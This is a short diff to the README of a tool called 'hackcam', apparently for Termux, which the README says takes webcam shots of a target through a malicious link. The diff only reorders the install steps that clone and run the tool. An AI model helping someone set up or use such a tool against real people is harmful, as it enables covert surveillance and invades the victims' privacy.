@@ -14,8 +14,9 @@ Take webcam shots from target just sending a malicious link
 ## Installing Termux:
 
 ```
-git clone https://github.com/sparkz-technology/hackcam
+pkg install git
 pkg install php
+git clone https://github.com/sparkz-technology/hackcam
 cd hackcam
 bash hackcam.sh
 ```
